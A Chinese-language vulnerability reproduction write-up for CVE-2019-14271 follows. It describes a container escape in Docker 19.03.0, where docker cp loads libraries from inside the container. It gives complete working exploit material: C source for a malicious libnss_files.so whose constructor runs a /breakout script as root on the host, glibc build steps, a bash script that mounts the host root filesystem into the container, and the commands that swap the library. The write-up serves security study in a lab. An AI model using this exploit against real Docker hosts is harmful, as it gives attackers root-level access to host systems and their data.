# CVE-2019-14271漏洞复现


## CVE-2019-14271：加载不受信任的动态链接库

##### 前置知识

当用户执行docker cp后，Docker守护进程会启动一个`docker-tar`进程来完成这项复制任务。拿"从容器内复制文件到宿主机上"为例，它会切换进程的根目录(`执行chroot`)到容器根目录，将需要复制的文件或目录打包，然后传递给Docker守护进程，Docker守护进程负责将内容解包到用户指定的宿主机目标路径。

##### 漏洞介绍

当Docker宿主机使用cp命令时，会调用辅助进程`docker-tar`组件，会加载容器内部的`nsswitch`动态链接库，但自身却未被容器化，攻击者可通过劫持容器内部的`nsswitch`动态链接库来实现对宿主机进程的恶意代码注入，获得宿主机上root权限的代码执行能力。

- chroot操作主要是为了避免符号链接导致的路径穿越问题，但新的问题也出现了。存在漏洞版本的docker-tar会加载必要的动态链接库，主要是以`libnss_`开头的`nsswitch`动态链接库`(libnss__*.so)`。`chroot`切换根目录后，docker-tar将加载容器内部的动态链接库。

##### 影响范围

Docker 19.03.0

##### 利用思路

1. 找出docker-tar具体会加载哪些容器内的动态链接库。
2. 下载对应动态链接库源码，为其增加一个`__attribute__((constructor))`的属性的函数`run_at_link`（该属性意味着在动态链接库被进程加载时，run_at_link函数会首先执行),在`run_at_link`函数中放置我们希望`docker-tar`执行的`payload`；编译生成动态链接库文件。
3. 编写辅助脚本`breakout`,将辅助脚本和步骤2生成的恶意动态链接库放入恶意容器，等待用户对容器执行docker cp命令，触发漏洞。

### 搭建环境

使用Metarget提供的靶场环境

直接执行以下命令

```
./metarget cnv install cve-2019-14271
```

![](/CVE-2019-14271漏洞复现/CVE-2019-14271-1.jpg)

安装好存在cve-2019-14271漏洞的docker。

#### 定位动态链接库

docker-tar启动后会加载的容器内动态链接库，有两种方法定位。

1. 分析Docker源码，抽丝剥茧，不过也比较费时间

2. 执行一次docker cp命令，观察在这个过程中容器内部哪些动态链接库被加载了。（Linux提供了`inotify`机制，用来监控文件系统变化）

   - `inotify-tools`是一系列基于`inotify`机制开发而成的命令行工具，我们可以借组这些命令行工具来监控`docker-tar`对容器内动态链接库的使用情况。

   在存在漏洞的Docker环境中，首先执行下面命令，运行一个容器:

   ```
   docker run -itd --name=test ubuntu	
   ```

然后，我们要拿到容器在宿主机上的绝对路径，才能对它进行监控。执行以下命令:

```
docker exec -it test cat /proc/mounts | grep docker
```

返回结果中包含类似下面这样的字符串:

```
workdir=/var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/work
```

那么容器根目录在宿主机上的绝对路径为:

```
/var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/merged
```

接着，执行如下命令，在另一个终端中使用`inotifywait`工具，在宿主机上监听容器文件系统中lib目录的事件:

```
apt install -y inotify-tools
inotifywait -mr /var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/merged/lib
```

![](/CVE-2019-14271漏洞复现/CVE-2019-14271-2.jpg)

现在就可以执行docker cp了，比如，我们执行:

```
docker cp test:/etc/passwd ./
```

然后可以在之前的终端中看到inotifywait的输出，例如:

![](/CVE-2019-14271漏洞复现/CVE-2019-14271-3.jpg)

可以看到，在这次复制操作中，docker-tar加载了`libnss_files-2.31.so`,后面，我们选择`libnss_files-2.31.so`为目标，构造一个恶意得动态链接库来替换它。

##### 构建动态链接库

`libnss_*.so`均在Glibc中，我们首先下载Glibc库
https://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.bz2

之后解压到本地目录，我这里的话是

/root/gnu/glibc-2.31。然后在/root/gnu目录新建一个glibc-build目录，作为构建目录。

```
tar -jxvf glibc-2.31-tar.bz2
```

进入 glibc-2.31

```
cd glibc-2.31
```

注释掉`glibc-2.31/Makeconfig`文件中得一行警告设置，避免加入恶意payload后编译失败:

```
+gccwarn-c = -Wstrict-prototypes -Wold-style-definition
```

接着，我们就可以在源代码中添加恶意`payload`了

可以在`glibc-2.31/nss/nss_files`目录下任意源码中添加`payload`

这里选择`files-service.c`文件，不必过多操作，作为一个获取控制权的途径，把真正具有威胁的操作放入容器内/breakout脚本中，让动态链接库去执行/breakout脚本文件即可。

在其中一个源文件中添加函数run_at_link()，使用构造函数定义该函数，所以每次进程加载时，run_at_link()函数都能够作为库的初始化函数执行，即docker-tar进程动态加载此库，函数就会执行。

在`files-service.c`文件中加入如下payload

```
// content should be added into nss/nss_files/files-service.c
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>
//容器内部原始original_libnss_files.so.2文件的备份位置
#define ORIGINAL_LIBNSS "/original_libnss_files.so.2"
//恶意original_libnss_files.so.2的位置
#define LIBNSS_PATH "/lib/x86_64-linux-gnu/libnss_files.so.2"

bool is_priviliged();
//带有constructor属性的函数会在动态链接库被加载时自动执行
__attribute__ ((constructor)) void run_at_link(void) {
     char * argv_break[2];
    //判断当前是否时容器外的高权限进程（docker-tar）
    //如果时容器内进程，则不做任何操作
     if (!is_priviliged())
           return;
	//攻击只需要执行一次即可
    //用备份的原始libnss_files.so.2文件替换恶意libnss_files.so.2文件
    //避免后续的docker cp操作持续加载恶意libnss_files.so.2文件
     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);
	//以docker-tar进程的身份创建新进程，执行容器内的breakout脚本
     if (!fork()) {
        // Child runs breakout
        argv_break[0] = strdup("/breakout");
        argv_break[1] = NULL;
        execve("/breakout", argv_break, NULL);
     }
     else
        wait(NULL); // Wait for child

     return;
}

bool is_priviliged() {
     FILE * proc_file = fopen("/proc/self/exe", "r");
     if (proc_file != NULL) {
           fclose(proc_file);
           return false; // can open so /proc exists, not privileged
     }
     return true; // we're running in the context of docker-tar
}
```

恶意`libnss_files.so.2`文件被加载时，首先会判断当前加载进程是否为`docker-tar`进程，如果是，则以当前进程的身份执行/breakout脚本。由于docker-tar并未做其他命名空间级别上的隔离，因此/breakout会以docker-tar自身的root权限在宿主机命名空间内执行。

下面编译生成恶意链接文件

```
cd /root/gnu/glibc-build
mkdir config1
../glibc-2.31/configure --prefix=/root/gnu/glibc-build/config1/
make
//生成的恶意动态链接库文件为/glibc-build/nss/libnss_files.so；要注意的是libnss_files.so.2为链接文件，别弄错了
```

这里我们执行失败了

```
../glibc-2.31/configure --prefix=/root/gnu/glibc-build/config1/
```

![](/CVE-2019-14271漏洞复现/CVE-2019-14271-4.jpg)

是因为缺少了依赖，所以报错

```
apt install bison
apt install gawk
```

之后执行一遍命令就不会报错了

我们`make`下

要在/root/gnu/glibc-build/目录下执行

第一次编译`Glibc`需要一些时间，后面再次编译就会快很多。编译结束后，`glibc-build/nss/libnss_files.so`就是我们需要的恶意动态链接库文件。

##### 实现逃逸

现在，我们已经构造好恶意的动态链接库文件`libnss_files.so`。在存在漏洞的dokcer环境中，如果用户执行了docker cp，后台的`docker-tar`进程在执行了chroot命令后一旦加载恶意文件`libnss_files.so`，那么容器内/breakout脚本就会以`docker-tar`身份执行。

由于`docker-tar`已经切换了根目录，但还没有加入容器的命名空间，考虑在/breakout中执行挂载操作，由`docker-tar`将宿主机根目录挂在到容器内的`/host_fs`路径。这样就实现了文件系统层面的容器逃逸。

1. 将此脚本拷贝到容器根目录，并给它加上777权限

   ```
   #!/bin/bash
   
   umount /host_fs && rm -rf /host_fs
   mkdir /host_fs
   
   
   mount -t proc none /proc     # mount the host's procfs over /proc
   cd /proc/1/root              # chdir to host's root
   mount --bind . /host_fs      # mount host root at /host_fs
   
   ```

2. 将容器内原有的libnss_file.so拷贝到容器根目录并重命名

3. 用构建好的libnss_files.so库替换原有正常库(记得改名)

```
root@513601b08ff9:/# chmod 777 breakout
root@513601b08ff9:/lib/x86_64-linux-gnu# ls -l | grep libnss_files
-rw-r--r--  1 root root   51832 Dec 16  2020 libnss_files-2.31.so
lrwxrwxrwx  1 root root      20 Dec 16  2020 libnss_files.so.2 -> libnss_files-2.31.so
root@513601b08ff9:/lib/x86_64-linux-gnu# cp libnss_files-2.31.so /original_libnss_files.so.2
root@513601b08ff9:/lib/x86_64-linux-gnu# rm ./libnss_files.so.2
root@513601b08ff9:/# mv libnss_files.so /lib/x86_64-linux-gnu/libnss_files.so.2
root@513601b08ff9:/# ls
bin       dev   lib    libx32  opt                         root  srv  usr
boot      etc   lib32  media   original_libnss_files.so.2  run   sys  var
breakout  home  lib64  mnt     proc                        sbin  tmp


```

![](/CVE-2019-14271漏洞复现/CVE-2019-14271-5.jpg)

之后使用命令

```
docker cp test:/etc/passwd ./ 
```

##### 复现成功

![CVE-2019-14271-6](/CVE-2019-14271漏洞复现/CVE-2019-14271-6.jpg)

![CVE-2019-14271-6](/CVE-2019-14271漏洞复现/CVE-2019-14271-7.jpg)
